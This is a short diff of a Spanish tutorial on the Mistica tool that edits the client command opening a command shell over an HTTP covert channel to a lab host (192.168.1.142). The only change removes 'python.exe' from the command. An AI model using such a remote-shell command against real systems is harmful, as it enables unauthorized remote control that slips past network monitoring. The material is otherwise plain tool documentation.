@@ -289,7 +289,7 @@ Si queremos ejecutar comandos en el cliente
 **Cliente**
 
 
-`python.exe mc.py -m shell:http -w "--hostname 192.168.1.142 --port 80 --header User-Agent= --success-code 404" -k key`
+`mc.py -m shell:http -w "--hostname 192.168.1.142 --port 80 --header User-Agent= --success-code 404" -k key`
 
 ![image124.png]({{site.baseurl}}/images/Mistica/image124.png)
 
